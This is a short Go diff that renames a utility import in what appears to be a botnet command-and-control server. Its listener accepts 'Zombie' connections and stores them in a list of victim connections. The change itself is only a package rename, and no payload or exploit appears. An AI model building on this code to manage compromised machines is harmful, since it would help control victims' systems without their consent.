@@ -3,7 +3,7 @@ package main
 import (
 	"fmt"
 	"mirage/global"
-	"mirage/utils"
+	"mirage/util"
 	"net"
 	"strings"
 )
@@ -18,6 +18,6 @@ func acceptConnection(listener *net.Listener) {
 			fmt.Println("Accepted Zombie")
 			global.VictimsConnection = append(global.VictimsConnection, &conn)
 		}
-		utils.SetTitle(&conn)
+		util.SetTitle(&conn)
 	}
 }
